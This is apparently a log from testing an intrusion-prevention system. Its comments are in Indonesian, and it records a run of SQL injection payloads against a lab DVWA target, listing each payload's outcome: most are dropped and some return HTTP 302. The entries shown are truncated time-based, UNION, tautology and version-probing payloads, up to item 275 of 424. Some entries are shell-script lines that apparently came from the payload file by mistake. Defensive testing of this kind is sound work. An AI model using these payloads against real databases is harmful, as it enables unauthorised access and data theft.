@@ -1,0 +1,1344 @@
+[LOG] Logging dimulai: 2026-07-04 07:44:43
+[LOG] File log: /home/ubuntu/Documents/HNIPS_project/runner_scripts/saved_logs/attacker/log-nomor 1_send_attack.txt
+
+========================================================
+  NODE ATTACKER: SEND ATTACK (SQLi Payloads)
+========================================================
+  Target  : http://172.17.0.2/vulnerabilities/sqli/
+  File    : /home/ubuntu/Documents/HNIPS_project/sqli_payloads.txt
+  Payloads: 424
+  Cookie  : PHPSESSID=pgdrle5m5kd2rdvs9rbp8u6il6; se...
+========================================================
+
+  Format output:
+  -> Menampilkan payload yang dikirim
+  -> HTTP Status Code respons dari server
+  (Status 000/timeout = paket di-DROP oleh IPS)
+
+========================================================
+[  1/424] \\n union all select 1337,1337,1337,1337,1337,1337,1337,1337 [DROP] BLOCKED/DROPPED (timeout)
+[  2/424] 0x00' union all select cast(pg_sleep(120) as integer),null,n [DROP] BLOCKED/DROPPED (timeout)
+[  3/424] %0d%0a\\' union all select cast(pg_sleep(120) as integer),nu [DROP] BLOCKED/DROPPED (timeout)
+[  4/424] %0d%0a union all select '1337','1337','1337','1337' waitfor  [DROP] BLOCKED/DROPPED (timeout)
+[  5/424] %00\' union all select cast(pg_sleep(120) as integer),null,n [DROP] BLOCKED/DROPPED (timeout)
+[  6/424] 0x0a\\' union all select sleep(120),1337,1337,1337 --        [DROP] BLOCKED/DROPPED (timeout)
+[  7/424] \\n' union all select cast(pg_sleep(120) as integer),'1337', [DROP] BLOCKED/DROPPED (timeout)
+[  8/424] 0x00\' union all select sleep(120),null,null --              [DROP] BLOCKED/DROPPED (timeout)
+[  9/424] \r\n\' union all select 1337,1337,1337,1337 waitfor delay \' [DROP] BLOCKED/DROPPED (timeout)
+[ 10/424] %0a\' union all select cast(pg_sleep(120) as text),'1337','1 [DROP] BLOCKED/DROPPED (timeout)
+[ 11/424] %00 union all select cast(pg_sleep(120) as text),null,null,n [DROP] BLOCKED/DROPPED (timeout)
+[ 12/424] 0x0a\\' union all select (select 1337 from pg_sleep(120)),nu [DROP] BLOCKED/DROPPED (timeout)
+[ 13/424] 0x0a' union all select sleep(120),1337,1337,1337,1337,1337,1 [DROP] BLOCKED/DROPPED (timeout)
+[ 14/424] %0a union all select sleep(120),null,null,null,null,null,nul [DROP] BLOCKED/DROPPED (timeout)
+[ 15/424] \r\n\' union all select sleep(120),1337,1337,1337,1337,1337, [DROP] BLOCKED/DROPPED (timeout)
+[ 16/424] \\r\\n\\' union all select cast(pg_sleep(120) as text),1337, [DROP] BLOCKED/DROPPED (timeout)
+[ 17/424] %0d%0a union all select cast(pg_sleep(120) as integer),'1337 [DROP] BLOCKED/DROPPED (timeout)
+[ 18/424] \\' union all select cast(pg_sleep(120) as integer),1337,133 [DROP] BLOCKED/DROPPED (timeout)
+[ 19/424] UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000 [DROP] BLOCKED/DROPPED (timeout)
+[ 20/424] \r\n union all select sleep(120),null,null,null,null --      [DROP] BLOCKED/DROPPED (timeout)
+[ 21/424] %0a and 1337=(select 1337 from (select sleep(120))A) --      [DROP] BLOCKED/DROPPED (timeout)
+[ 22/424] %0a waitfor delay '00:02'                                    [DROP] BLOCKED/DROPPED (timeout)
+[ 23/424] 0x00\' union all select (select 1337 from pg_sleep(120)),nul [DROP] BLOCKED/DROPPED (timeout)
+[ 24/424] \\n\\' union all select cast(pg_sleep(120) as integer),1337, [DROP] BLOCKED/DROPPED (timeout)
+[ 25/424] %0a union all select sleep(120) --                           [DROP] BLOCKED/DROPPED (timeout)
+[ 26/424] %00 union all select sleep(120)                              [DROP] BLOCKED/DROPPED (timeout)
+[ 27/424] %0d%0a union all select (select 1337 from pg_sleep(120)),nul [DROP] BLOCKED/DROPPED (timeout)
+[ 28/424] ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9, [DROP] BLOCKED/DROPPED (timeout)
+[ 29/424] \\r\\n\\' and 1337=(select 1337 from pg_sleep(120)) --       [DROP] BLOCKED/DROPPED (timeout)
+[ 30/424] ' union all select cast(pg_sleep(120) as text),1337 --       [DROP] BLOCKED/DROPPED (timeout)
+[ 31/424] 0x00\' union all select cast(pg_sleep(120) as text),1337,133 [DROP] BLOCKED/DROPPED (timeout)
+[ 32/424] )) waitfor delay '0:0:__TIME__' /*                           [DROP] BLOCKED/DROPPED (timeout)
+[ 33/424] \\n' union all select cast(pg_sleep(120) as text),null,null, [DROP] BLOCKED/DROPPED (timeout)
+[ 34/424] 0x0d0a union all select null,null,null,null,null,null,null,n [DROP] BLOCKED/DROPPED (timeout)
+[ 35/424] \\r\\n union all select 1337,1337,1337,1337,1337,1337 waitfo [DROP] BLOCKED/DROPPED (timeout)
+[ 36/424] 0x00\\' union all select cast(pg_sleep(120) as text),'1337', [DROP] BLOCKED/DROPPED (timeout)
+[ 37/424] 0x00\\' union all select cast(pg_sleep(120) as integer),null [DROP] BLOCKED/DROPPED (timeout)
+[ 38/424] 0x00;select pg_sleep(120)                                    [DROP] BLOCKED/DROPPED (timeout)
+[ 39/424] %0a union all select cast(pg_sleep(120) as integer),1337,133 [DROP] BLOCKED/DROPPED (timeout)
+[ 40/424] \n' union all select cast(pg_sleep(120) as integer),1337,133 [DROP] BLOCKED/DROPPED (timeout)
+[ 41/424] %00 union all select cast(dbms_pipe.receive_message((\'a\'), [DROP] BLOCKED/DROPPED (timeout)
+[ 42/424] \r\n union all select '1337','1337','1337' from dual         [DROP] BLOCKED/DROPPED (timeout)
+[ 43/424] %0a' union all select cast(dbms_pipe.receive_message(1,120)  [DROP] BLOCKED/DROPPED (timeout)
+[ 44/424] 0x0a' union all select cast(dbms_pipe.receive_message(('a'), [DROP] BLOCKED/DROPPED (timeout)
+[ 45/424] \\n union all select cast(dbms_pipe.receive_message((\'a\'), [DROP] BLOCKED/DROPPED (timeout)
+[ 46/424] %0d%0a' union all select cast(dbms_pipe.receive_message(('a' [DROP] BLOCKED/DROPPED (timeout)
+[ 47/424] %0a union all select dbms_pipe.receive_message(1,120),1337,1 [DROP] BLOCKED/DROPPED (timeout)
+[ 48/424] %0a union all select null,null from dual --                  [DROP] BLOCKED/DROPPED (timeout)
+[ 49/424] %00\' union all select '1337','1337','1337','1337','1337','1 [DROP] BLOCKED/DROPPED (timeout)
+[ 50/424] 0x0a' union all select cast(dbms_pipe.receive_message(1,120) [DROP] BLOCKED/DROPPED (timeout)
+[ 51/424] 0x0d0a union all select 1337,1337,1337,1337,1337,1337,1337,1 [DROP] BLOCKED/DROPPED (timeout)
+[ 52/424] \n union all select cast(dbms_pipe.receive_message(('a'),120 [DROP] BLOCKED/DROPPED (timeout)
+[ 53/424] 0x0a' union all select dbms_pipe.receive_message(('a'),120), [DROP] BLOCKED/DROPPED (timeout)
+[ 54/424] \n union all select dbms_pipe.receive_message((\'a\'),120),n [DROP] BLOCKED/DROPPED (timeout)
+[ 55/424] %0d%0a union all select dbms_pipe.receive_message((\'a\'),12 [DROP] BLOCKED/DROPPED (timeout)
+[ 56/424] \n union all select cast(dbms_pipe.receive_message(1,120) as [DROP] BLOCKED/DROPPED (timeout)
+[ 57/424] \n union all select cast(dbms_pipe.receive_message((\'a\'),1 [DROP] BLOCKED/DROPPED (timeout)
+[ 58/424] \\n' union all select dbms_pipe.receive_message(1,120),null, [DROP] BLOCKED/DROPPED (timeout)
+[ 59/424] \\n\\' union all select cast(dbms_pipe.receive_message((\\'a [DROP] BLOCKED/DROPPED (timeout)
+[ 60/424] \\r\\n' union all select cast(dbms_pipe.receive_message(('a' [DROP] BLOCKED/DROPPED (timeout)
+[ 61/424] union all select cast(dbms_pipe.receive_message(1,120) as in [DROP] BLOCKED/DROPPED (timeout)
+[ 62/424] \\r\\n' union all select dbms_pipe.receive_message(('a'),120 [DROP] BLOCKED/DROPPED (timeout)
+[ 63/424] \\n union all select cast(dbms_pipe.receive_message(1,120) a [DROP] BLOCKED/DROPPED (timeout)
+[ 64/424] 0x00\' union all select null,null,null,null,null,null --     [DROP] BLOCKED/DROPPED (timeout)
+[ 65/424] \r\n union all select cast(dbms_pipe.receive_message(('a'),1 [DROP] BLOCKED/DROPPED (timeout)
+[ 66/424] union all select cast(dbms_pipe.receive_message(1,120) as in [DROP] BLOCKED/DROPPED (timeout)
+[ 67/424] \r\n' union all select 1337,1337,1337,1337,1337,1337,1337,13 [DROP] BLOCKED/DROPPED (timeout)
+[ 68/424] \r\n union all select cast(dbms_pipe.receive_message(1,120)  [DROP] BLOCKED/DROPPED (timeout)
+[ 69/424] %0d%0a union all select dbms_pipe.receive_message(('a'),120) [DROP] BLOCKED/DROPPED (timeout)
+[ 70/424] \n union all select cast(dbms_pipe.receive_message((\'a\'),1 [DROP] BLOCKED/DROPPED (timeout)
+[ 71/424] \r\n\' union all select cast(dbms_pipe.receive_message(1,120 [DROP] BLOCKED/DROPPED (timeout)
+[ 72/424] %00' union all select 1337,1337,1337 from dual --            [DROP] BLOCKED/DROPPED (timeout)
+[ 73/424] \n union all select dbms_pipe.receive_message(1,120),'1337', [DROP] BLOCKED/DROPPED (timeout)
+[ 74/424] 0x00\\' union all select dbms_pipe.receive_message(1,120),nu [DROP] BLOCKED/DROPPED (timeout)
+[ 75/424] 0x00 union all select cast(dbms_pipe.receive_message(('a'),1 [DROP] BLOCKED/DROPPED (timeout)
+[ 76/424] 0x0d0a' union all select cast(dbms_pipe.receive_message(1,12 [DROP] BLOCKED/DROPPED (timeout)
+[ 77/424] 0x0d0a\' union all select cast(dbms_pipe.receive_message(1,1 [DROP] BLOCKED/DROPPED (timeout)
+[ 78/424] ' union all select '1337','1337','1337','1337','1337','1337' [DROP] BLOCKED/DROPPED (timeout)
+[ 79/424] UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,1 [DROP] BLOCKED/DROPPED (timeout)
+[ 80/424] 0x00\\' union all select null,null from dual --              [DROP] BLOCKED/DROPPED (timeout)
+[ 81/424] \r\n union all select cast(dbms_pipe.receive_message(('a'),1 [DROP] BLOCKED/DROPPED (timeout)
+[ 82/424] union all select 1337,1337,1337 --                           [DROP] BLOCKED/DROPPED (timeout)
+[ 83/424] 0x0d0a\\' union all select cast(dbms_pipe.receive_message((\ [DROP] BLOCKED/DROPPED (timeout)
+[ 84/424] 0x0a union all select cast(dbms_pipe.receive_message(1,120)  [DROP] BLOCKED/DROPPED (timeout)
+[ 85/424] union all select dbms_pipe.receive_message(('a'),120),'1337' [DROP] BLOCKED/DROPPED (timeout)
+[ 86/424] 0x00\\' union all select cast(dbms_pipe.receive_message(1,12 [DROP] BLOCKED/DROPPED (timeout)
+[ 87/424] %0d%0a union all select cast(dbms_pipe.receive_message(('a') [DROP] BLOCKED/DROPPED (timeout)
+[ 88/424] 0x0a union all select '1337','1337','1337','1337','1337','13 [DROP] BLOCKED/DROPPED (timeout)
+[ 89/424] \\n\\' union all select cast(dbms_pipe.receive_message((\\'a [DROP] BLOCKED/DROPPED (timeout)
+[ 90/424] \\n' union all select null,null,null,null --                 [DROP] BLOCKED/DROPPED (timeout)
+[ 91/424] 0x00' union all select dbms_pipe.receive_message(1,120),null [DROP] BLOCKED/DROPPED (timeout)
+[ 92/424] \r\n union all select cast(dbms_pipe.receive_message((\'a\') [DROP] BLOCKED/DROPPED (timeout)
+[ 93/424] \n union all select dbms_pipe.receive_message((\'a\'),120),' [DROP] BLOCKED/DROPPED (timeout)
+[ 94/424] %0a union all select cast(dbms_pipe.receive_message((\'a\'), [DROP] BLOCKED/DROPPED (timeout)
+[ 95/424] \\r\\n union all select dbms_pipe.receive_message(('a'),120) [DROP] BLOCKED/DROPPED (timeout)
+[ 96/424] \r\n' union all select cast(dbms_pipe.receive_message(('a'), [DROP] BLOCKED/DROPPED (timeout)
+[ 97/424] 0x0d0a\\' union all select '1337','1337','1337','1337','1337 [DROP] BLOCKED/DROPPED (timeout)
+[ 98/424] 0x0d0a\\' union all select cast(dbms_pipe.receive_message(1, [DROP] BLOCKED/DROPPED (timeout)
+[ 99/424] \r\n union all select cast(dbms_pipe.receive_message(1,120)  [DROP] BLOCKED/DROPPED (timeout)
+[100/424] union all select '1337','1337','1337','1337','1337','1337',' [DROP] BLOCKED/DROPPED (timeout)
+[101/424] root' or 1=1--                                               [DROP] BLOCKED/DROPPED (timeout)
+[102/424] AND 7506=9091 AND (5913=5913                                 [DROP] BLOCKED/DROPPED (timeout)
+[103/424] root" or 1=1                                                 [DROP] BLOCKED/DROPPED (timeout)
+[104/424] root'or 1=1 or ''='                                          [DROP] BLOCKED/DROPPED (timeout)
+[105/424] AND 7300=7300 AND ('pKlZ'='pKlZ                              [DROP] BLOCKED/DROPPED (timeout)
+[106/424] or 1=1--                                                     [DROP] BLOCKED/DROPPED (timeout)
+[107/424] AND 1=0 AND '%'='                                            [DROP] BLOCKED/DROPPED (timeout)
+[108/424] AS INJECTX WHERE 1=1 AND 1=0#                                [DROP] BLOCKED/DROPPED (timeout)
+[109/424] 2 and 456=678                                                [DROP] BLOCKED/DROPPED (timeout)
+[110/424] hi or 1=1 --"                                                [DROP] BLOCKED/DROPPED (timeout)
+[111/424] OR 1=0--                                                     [DROP] BLOCKED/DROPPED (timeout)
+[112/424] 0x00 or 20=20                                                [DROP] BLOCKED/DROPPED (timeout)
+[113/424] WHERE 1=1 AND 1=0#                                           [DROP] BLOCKED/DROPPED (timeout)
+[114/424] OR 3409=3409 AND ('pytW' LIKE 'pytY                          [DROP] BLOCKED/DROPPED (timeout)
+[115/424] AND 7300=7300 AND ('pKlZ'='pKlY                              [DROP] BLOCKED/DROPPED (timeout)
+[116/424] AND 7506=9091 AND ('5913=5913                                [DROP] BLOCKED/DROPPED (timeout)
+[117/424] badparams=`echo "$cleanoutput" | replace "$payload" "a\" or  [DROP] BLOCKED/DROPPED (timeout)
+[118/424] badparams=`echo "$cleanoutput" | replace "$payload" "a' or 7 [DROP] BLOCKED/DROPPED (timeout)
+[119/424] AND 1=1                                                      [DROP] BLOCKED/DROPPED (timeout)
+[120/424] or 1=1 /*                                                    [DROP] BLOCKED/DROPPED (timeout)
+[121/424] admin" or 1=1#                                               [DROP] BLOCKED/DROPPED (timeout)
+[122/424] OR 1=1#                                                      [DROP] BLOCKED/DROPPED (timeout)
+[123/424] WHERE 1=1 AND 1=1                                            [DROP] BLOCKED/DROPPED (timeout)
+[124/424] AND 1=1                                                      [DROP] BLOCKED/DROPPED (timeout)
+[125/424] or 20=20                                                     [DROP] BLOCKED/DROPPED (timeout)
+[126/424] root' or 1=1/*                                               [DROP] BLOCKED/DROPPED (timeout)
+[127/424] 0x0d0a\\' or 20=20 --                                        [DROP] BLOCKED/DROPPED (timeout)
+[128/424] \\n' or 20=20 --                                             [DROP] BLOCKED/DROPPED (timeout)
+[129/424] 23 or 1=1; --                                                [DROP] BLOCKED/DROPPED (timeout)
+[130/424] AS INJECTX WHERE 1=1 AND 1=0                                 [DROP] BLOCKED/DROPPED (timeout)
+[131/424] %0d%0a\\' or 20=20 --                                        [DROP] BLOCKED/DROPPED (timeout)
+[132/424] AS INJECTX WHERE 1=1 AND 1=1#                                [DROP] BLOCKED/DROPPED (timeout)
+[133/424] ‘ or 1=1 --                                                [DROP] BLOCKED/DROPPED (timeout)
+[134/424] \\r\\n or 20=20                                              [DROP] BLOCKED/DROPPED (timeout)
+[135/424] or 1=1 /*                                                    [DROP] BLOCKED/DROPPED (timeout)
+[136/424] OR 1=1--                                                     [DROP] BLOCKED/DROPPED (timeout)
+[137/424] OR 1=1#                                                      [DROP] BLOCKED/DROPPED (timeout)
+[138/424] AS INJECTX WHERE 1=1 AND 1=1#                                [DROP] BLOCKED/DROPPED (timeout)
+[139/424] " or 1=1                                                     [DROP] BLOCKED/DROPPED (timeout)
+[140/424] or 0=0 --                                                    [DROP] BLOCKED/DROPPED (timeout)
+[141/424] ' or 3=3 --                                                  [DROP] BLOCKED/DROPPED (timeout)
+[142/424] or 1=1--                                                     [DROP] BLOCKED/DROPPED (timeout)
+[143/424] or%201=1 --                                                  [DROP] BLOCKED/DROPPED (timeout)
+[144/424] a" or 1=1--                                                  [DROP] BLOCKED/DROPPED (timeout)
+[145/424] or 1=1/*                                                     [DROP] BLOCKED/DROPPED (timeout)
+[146/424] admin" or 1=1/*                                              [DROP] BLOCKED/DROPPED (timeout)
+[147/424] \' or 20=20 --                                               [DROP] BLOCKED/DROPPED (timeout)
+[148/424] AS INJECTX WHERE 1=1 AND 1=1                                 [DROP] BLOCKED/DROPPED (timeout)
+[149/424] %0a\' or 20=20 --                                            [DROP] BLOCKED/DROPPED (timeout)
+[150/424] ' or 0=0 --                                                  [DROP] BLOCKED/DROPPED (timeout)
+[151/424] \n' or 20=20 --                                              [DROP] BLOCKED/DROPPED (timeout)
+[152/424] %0a or 20=20                                                 [DROP] BLOCKED/DROPPED (timeout)
+[153/424] AND 7300=7300 AND 'pKlZ'='pKlY                               [DROP] BLOCKED/DROPPED (timeout)
+[154/424] WHERE 1=1 AND 1=1--                                          [DROP] BLOCKED/DROPPED (timeout)
+[155/424] AND 1083=1083 AND ('1427=1427                                [DROP] BLOCKED/DROPPED (timeout)
+[156/424] badparams=`echo "$cleanoutput" | replace "$payload" "a\" or  [DROP] BLOCKED/DROPPED (timeout)
+[157/424] " or 1=1--                                                   [DROP] BLOCKED/DROPPED (timeout)
+[158/424] OR 1=0#                                                      [DROP] BLOCKED/DROPPED (timeout)
+[159/424] ' or 1=1 --                                                  [DROP] BLOCKED/DROPPED (timeout)
+[160/424] AND 1=1 AND '%'='                                            [DROP] BLOCKED/DROPPED (timeout)
+[161/424] a' or 3=3--                                                  [DROP] BLOCKED/DROPPED (timeout)
+[162/424] \n or 20=20                                                  [DROP] BLOCKED/DROPPED (timeout)
+[163/424] \\r\\n' or 20=20 --                                          [DROP] BLOCKED/DROPPED (timeout)
+[164/424] AND 1=1 AND '%'='                                            [DROP] BLOCKED/DROPPED (timeout)
+[165/424] or 1=1#                                                      [DROP] BLOCKED/DROPPED (timeout)
+[166/424] 0x0a' or 20=20 --                                            [DROP] BLOCKED/DROPPED (timeout)
+[167/424] %00' or 20=20 --                                             [DROP] BLOCKED/DROPPED (timeout)
+[168/424] ' and 1=0) union all                                         [DROP] BLOCKED/DROPPED (timeout)
+[169/424] %00\' or 20=20 --                                            [DROP] BLOCKED/DROPPED (timeout)
+[170/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[171/424] obuff=$obuff"%2f%2a%5b%31%5d"                                [DROP] BLOCKED/DROPPED (timeout)
+[172/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[173/424] end="%20%6f%72%20%2f%61%5b%63%6f%6e%74%61%69%6e%73%28%61%2c% [DROP] BLOCKED/DROPPED (timeout)
+[174/424] ")))) and 0=benchmark(3000000,MD5(1))%20%23                  [DROP] BLOCKED/DROPPED (timeout)
+[175/424] N) # Filter Evasion Intermediary chars ' ' => '%2f%2a%0B%0C% [DROP] BLOCKED/DROPPED (timeout)
+[176/424] '))) and 0=benchmark(3000000,MD5(1))%20%23                   [DROP] BLOCKED/DROPPED (timeout)
+[177/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[178/424] %27%20or%201=1                                               [WARN] HTTP 302
+[179/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[180/424] ' and 0=benchmark(3000000,MD5(1))%20%23                      [DROP] BLOCKED/DROPPED (timeout)
+[181/424] vbuff="%2f%2a%5b$xcount%5d"                                  [DROP] BLOCKED/DROPPED (timeout)
+[182/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[183/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[184/424] " and 0=benchmark(3000000,MD5(1))%20%23                      [DROP] BLOCKED/DROPPED (timeout)
+[185/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[186/424] badparams=`echo "$cleanoutput" | replace "$payload" "%27%20% [DROP] BLOCKED/DROPPED (timeout)
+[187/424] echo "  -z Multi-byte quote                   '''        '%b [DROP] BLOCKED/DROPPED (timeout)
+[188/424] badparams=`echo "$cleanoutput" | replace "$payload" "%27%20% [DROP] BLOCKED/DROPPED (timeout)
+[189/424] ") and 0=benchmark(3000000,MD5(1))%20%23                     [DROP] BLOCKED/DROPPED (timeout)
+[190/424] encodeoutput=`echo $encodeoutput | replace "%20" "%234i5ugh4 [DROP] BLOCKED/DROPPED (timeout)
+[191/424] badparams=`echo "$cleanoutput" | replace "$payload" "%27%20% [DROP] BLOCKED/DROPPED (timeout)
+[192/424] echo "  -N Intermediary chars space           ' '        '%2 [DROP] BLOCKED/DROPPED (timeout)
+[193/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[194/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[195/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[196/424] end="%20%6f%72%20%2f%61%5b%27%61"                            [DROP] BLOCKED/DROPPED (timeout)
+[197/424] ))) and 0=benchmark(3000000,MD5(1))%20%23                    [WARN] HTTP 302
+[198/424] ) and 0=benchmark(3000000,MD5(1))%20%23                      [WARN] HTTP 302
+[199/424] ')) and 0=benchmark(3000000,MD5(1))%20%23                    [DROP] BLOCKED/DROPPED (timeout)
+[200/424] and 0=benchmark(3000000,MD5(1))%20%23                        [WARN] HTTP 302
+[201/424] )))) and 0=benchmark(3000000,MD5(1))%20%23                   [WARN] HTTP 302
+[202/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[203/424] badparams=`echo "$cleanoutput" | replace "$payload" "%27%20% [DROP] BLOCKED/DROPPED (timeout)
+[204/424] begin="%33%34%35%27%29%5d"                                   [DROP] BLOCKED/DROPPED (timeout)
+[205/424] ')))) and 0=benchmark(3000000,MD5(1))%20%23                  [DROP] BLOCKED/DROPPED (timeout)
+[206/424] echo "  -w Comment+newline space              ' '        '%2 [DROP] BLOCKED/DROPPED (timeout)
+[207/424] "))) and 0=benchmark(3000000,MD5(1))%20%23                   [DROP] BLOCKED/DROPPED (timeout)
+[208/424] end="%20%6f%72%20%27%65%27%3d%27%72"                         [DROP] BLOCKED/DROPPED (timeout)
+[209/424] ")) and 0=benchmark(3000000,MD5(1))%20%23                    [DROP] BLOCKED/DROPPED (timeout)
+[210/424] badparams=`echo "$cleanoutput" | replace "$payload" "%27%20% [DROP] BLOCKED/DROPPED (timeout)
+[211/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[212/424] ') and 0=benchmark(3000000,MD5(1))%20%23                     [DROP] BLOCKED/DROPPED (timeout)
+[213/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[214/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[215/424] /uploads/plus/rss.php?tid=1&_Cs[][1]&_Cs[2%29%29%20AND%20%22 [DROP] BLOCKED/DROPPED (timeout)
+[216/424] badparams=`echo "$cleanoutput" | replace "$payload" "%33%34% [DROP] BLOCKED/DROPPED (timeout)
+[217/424] )) and 0=benchmark(3000000,MD5(1))%20%23                     [WARN] HTTP 302
+[218/424] badparams=`echo "$cleanoutput" | replace "$payload" "$begin% [DROP] BLOCKED/DROPPED (timeout)
+[219/424] 0x00;select case when 20=20 then 'a'||dbms_pipe.receive_mess [DROP] BLOCKED/DROPPED (timeout)
+[220/424] RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE  [DROP] BLOCKED/DROPPED (timeout)
+[221/424] 0x0a\' or 20<94 --                                           [DROP] BLOCKED/DROPPED (timeout)
+[222/424] 0x0a or 'xyz'='xyz'                                          [DROP] BLOCKED/DROPPED (timeout)
+[223/424] 0x0a and 1337=dbms_pipe.receive_message((\\'a\\'),120)       [DROP] BLOCKED/DROPPED (timeout)
+[224/424] 0x0a';select banner from v$version --                        [DROP] BLOCKED/DROPPED (timeout)
+[225/424] 0x00\';select @@version --                                   [DROP] BLOCKED/DROPPED (timeout)
+[226/424] 0x0a;select @@version                                        [DROP] BLOCKED/DROPPED (timeout)
+[227/424] 0x730065006c00650063007400200040004000760065007200730069006f [DROP] BLOCKED/DROPPED (timeout)
+[228/424] 0x0d0a or 1337=dbms_pipe.receive_message(1,120)              [DROP] BLOCKED/DROPPED (timeout)
+[229/424] 0x0a\\';select version from v$instance --                    [DROP] BLOCKED/DROPPED (timeout)
+[230/424] 0x00 or 1337=dbms_pipe.receive_message(1,120)                [DROP] BLOCKED/DROPPED (timeout)
+[231/424] 0x00' or 1337=dbms_pipe.receive_message(1,120) --            [DROP] BLOCKED/DROPPED (timeout)
+[232/424] 0x0a and 1337=dbms_pipe.receive_message(1,120) --            [DROP] BLOCKED/DROPPED (timeout)
+[233/424] 0x0a and 1337=dbms_pipe.receive_message(('a'),120)           [DROP] BLOCKED/DROPPED (timeout)
+[234/424] 0x00';select version from v$instance --                      [DROP] BLOCKED/DROPPED (timeout)
+[235/424] declare @q nvarchar (200) 0x730065006c0065006300740020004000 [DROP] BLOCKED/DROPPED (timeout)
+[236/424] 0x0a\\';select case when 20=20 then \\'a\\'||dbms_pipe.recei [DROP] BLOCKED/DROPPED (timeout)
+[237/424] 0x00\' or \'xyz\'=\'xyz                                      [DROP] BLOCKED/DROPPED (timeout)
+[238/424] 0x770061006900740066006F0072002000640065006C0061007900200027 [DROP] BLOCKED/DROPPED (timeout)
+[239/424] 0x0a\\' or \\'xyz\\'=\\'xyz\\' --                            [DROP] BLOCKED/DROPPED (timeout)
+[240/424] 0x00';select case when 20=20 then 'a'||dbms_pipe.receive_mes [DROP] BLOCKED/DROPPED (timeout)
+[241/424] 0x00' or 1337=dbms_pipe.receive_message(('a'),120) --        [DROP] BLOCKED/DROPPED (timeout)
+[242/424] 0x00 or \\'xyz\\'=\\'xyz\\'                                  [DROP] BLOCKED/DROPPED (timeout)
+[243/424] declare @q nvarchar (200) 0x730065006c00650063 ...           [DROP] BLOCKED/DROPPED (timeout)
+[244/424] 0x0a' and 1337=dbms_pipe.receive_message(1,120) --           [DROP] BLOCKED/DROPPED (timeout)
+[245/424] 0x0a;select @@version --                                     [DROP] BLOCKED/DROPPED (timeout)
+[246/424] 0x0d0a' or 1337=dbms_pipe.receive_message(('a'),120) --      [DROP] BLOCKED/DROPPED (timeout)
+[247/424] 0x77616974666F722064656C61792027303A303A313027 ...           [DROP] BLOCKED/DROPPED (timeout)
+[248/424] 0x0d0a\' or 1337=dbms_pipe.receive_message((\'a\'),120) --   [DROP] BLOCKED/DROPPED (timeout)
+[249/424] %00 or 1337=dbms_pipe.receive_message((\'a\'),120) --        [DROP] BLOCKED/DROPPED (timeout)
+[250/424] %00' or 'xyz'='xyz' --                                       [DROP] BLOCKED/DROPPED (timeout)
+[251/424] %00;select version() --                                      [DROP] BLOCKED/DROPPED (timeout)
+[252/424] %00;select @@version --                                      [DROP] BLOCKED/DROPPED (timeout)
+[253/424] %00\';select version from v$instance --                      [DROP] BLOCKED/DROPPED (timeout)
+[254/424] %00;select banner from v$version                             [WARN] HTTP 302
+[255/424] echo "%00"$quack >> nullpayloads.txt                         [DROP] BLOCKED/DROPPED (timeout)
+[256/424] %00 or 1337=dbms_pipe.receive_message(1,120) --              [DROP] BLOCKED/DROPPED (timeout)
+[257/424] %00' or 20<94 --                                             [DROP] BLOCKED/DROPPED (timeout)
+[258/424] %00 and 1337=dbms_pipe.receive_message((\'a\'),120) --       [DROP] BLOCKED/DROPPED (timeout)
+[259/424] %00 or \\'xyz\\'=\\'xyz\\' --                                [DROP] BLOCKED/DROPPED (timeout)
+[260/424] %00' or 1337=dbms_pipe.receive_message(1,120) --             [DROP] BLOCKED/DROPPED (timeout)
+[261/424] %00 and 1337=dbms_pipe.receive_message((\\'a\\'),120) --     [DROP] BLOCKED/DROPPED (timeout)
+[262/424] %00;select case when 20=20 then \'a\'||dbms_pipe.receive_mes [DROP] BLOCKED/DROPPED (timeout)
+[263/424] %00;select banner from v$version --                          [DROP] BLOCKED/DROPPED (timeout)
+[264/424] %00\';select case when 20=20 then \'a\'||dbms_pipe.receive_m [DROP] BLOCKED/DROPPED (timeout)
+[265/424] %00\\' or \\'xyz\\'=\\'xyz                                   [DROP] BLOCKED/DROPPED (timeout)
+[266/424] %00 or \'xyz\'=\'xyz\' --                                    [DROP] BLOCKED/DROPPED (timeout)
+[267/424] %00;select case when 20=20 then 'a'||dbms_pipe.receive_messa [DROP] BLOCKED/DROPPED (timeout)
+[268/424] %00\\';select version() --                                   [DROP] BLOCKED/DROPPED (timeout)
+[269/424] ORDER BY 16                                                  [WARN] HTTP 302
+[270/424] ORDER BY 26--                                                [DROP] BLOCKED/DROPPED (timeout)
+[271/424] \\';select @@version --                                      [DROP] BLOCKED/DROPPED (timeout)
+[272/424] %0a;select version() --                                      [DROP] BLOCKED/DROPPED (timeout)
+[273/424] and (select substring(@@version,1,1))='M'                    [DROP] BLOCKED/DROPPED (timeout)
+[274/424] or 1 in (select @@version)--                                 [DROP] BLOCKED/DROPPED (timeout)
+[275/424] ORDER BY 22                                                  [WARN] HTTP 302
